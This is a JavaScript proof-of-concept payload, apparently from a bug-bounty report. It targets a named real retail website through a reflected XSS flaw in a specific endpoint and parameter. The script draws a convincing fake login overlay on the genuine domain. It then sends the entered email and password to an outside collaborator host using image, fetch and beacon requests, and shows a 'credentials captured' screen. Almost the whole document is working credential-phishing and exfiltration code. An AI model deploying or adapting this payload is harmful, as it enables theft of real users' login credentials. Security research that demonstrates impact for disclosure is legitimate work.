/* FND-014 phishing-impact PoC — runs in the https://www.watsons.ua origin.
   Renders a login form on the genuine domain; on submit, the typed credentials are
   sent to the tester's Burp Collaborator. For a bug-bounty writeup only. */
(function () {
  var d = document, O = d.domain;
  var C = 'https://6jqhwcf3sic62e48sgyqx1z7hynpbtzi.oastify.com/';   // <-- your Collaborator

  var css = d.createElement('style');
  css.textContent =
    '#ov{position:fixed;inset:0;background:rgba(18,18,24,.66);z-index:2147483647;display:flex;' +
    'align-items:center;justify-content:center;font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif}' +
    '#bx{background:#fff;width:410px;max-width:92vw;border-radius:12px;padding:34px 36px;box-shadow:0 26px 74px rgba(0,0,0,.5)}' +
    '#bx .b{font:800 24px -apple-system,Segoe UI,sans-serif;color:#00a3a1;letter-spacing:-.5px}' +
    '#bx h2{margin:14px 0 4px;font-size:20px;color:#18181b}#bx .s{color:#71717a;font-size:13px;margin-bottom:20px}' +
    '#bx label{display:block;font-size:12px;color:#52525b;margin:13px 0 5px;font-weight:600}' +
    '#bx input{width:100%;padding:12px;border:1px solid #d4d4d8;border-radius:7px;box-sizing:border-box;font-size:14px}' +
    '#bx input:focus{outline:none;border-color:#00a3a1;box-shadow:0 0 0 3px rgba(0,163,161,.16)}' +
    '#bt{width:100%;margin-top:22px;padding:12px;background:#00a3a1;color:#fff;border:0;border-radius:7px;font-size:15px;font-weight:700;cursor:pointer}' +
    '#og{margin-top:18px;padding:9px 11px;background:#f4f4f5;border-radius:7px;font:12px ui-monospace,Consolas,monospace;color:#3f3f46;word-break:break-all}' +
    '#rs{background:#0b1020;color:#d6e2ff;border-radius:12px;padding:26px 28px;width:660px;max-width:94vw;font:13px/1.7 ui-monospace,Consolas,monospace}' +
    '#rs h3{margin:0 0 14px;font:700 17px -apple-system,Segoe UI,sans-serif;color:#fff}#rs .k{color:#7dd3fc}#rs .v{color:#fde68a;word-break:break-all}' +
    '#rs .n{margin-top:18px;padding:12px 14px;background:#14213d;border-left:3px solid #38bdf8;font:12px/1.6 -apple-system,Segoe UI,sans-serif;color:#cbd5e1}';
  d.head.appendChild(css);

  var ov = d.createElement('div'); ov.id = 'ov';
  ov.innerHTML =
    '<div id="bx"><div class="b">Watsons</div>' +
    '<h2>Вхід в особистий кабінет</h2><div class="s">Сесія завершилася. Будь ласка, увійдіть знову.</div>' +
    '<label>E-mail</label><input id="u" type="email" autocomplete="username" placeholder="you@example.com">' +
    '<label>Пароль</label><input id="p" type="password" autocomplete="current-password" placeholder="••••••••">' +
    '<button id="bt">Увійти</button><div id="og"></div></div>';
  d.body.appendChild(ov);
  d.getElementById('og').textContent = '\uD83D\uDD12 https://' + O + ' — genuine origin, valid certificate';
  d.title = 'watsons.ua';

  var KEEP = [];
  d.getElementById('bt').addEventListener('click', function () {
    var user = d.getElementById('u').value || '(blank)';
    var pass = d.getElementById('p').value || '(blank)';
    var url = C + 'creds?origin=' + encodeURIComponent(O) +
              '&username=' + encodeURIComponent(user) +
              '&password=' + encodeURIComponent(pass);
    try { var im = new Image(); KEEP.push(im); im.src = url; } catch (e) {}
    try { fetch(url, { mode: 'no-cors', keepalive: true }); } catch (e) {}
    try { navigator.sendBeacon && navigator.sendBeacon(url); } catch (e) {}
    ov.innerHTML = '<div id="rs"><h3>Credentials captured &amp; exfiltrated</h3>' +
      '<div><span class="k">username:</span> <span class="v">' + user.replace(/[<>&]/g,'') + '</span></div>' +
      '<div><span class="k">password:</span> <span class="v">' + pass.replace(/[<>&]/g,'') + '</span></div>' +
      '<div class="n">Sent to <b>' + C.replace('https://','').replace('/','') + '</b> from the <b>' + O +
      '</b> origin. The victim never left the genuine www.watsons.ua domain (valid TLS cert). ' +
      'Delivered by unauthenticated reflected XSS in the <code>varCode</code> parameter of ' +
      '<code>POST /uk/stockAnonymousNotification</code>, which has no Content-Security-Policy.</div></div>';
  });
})();
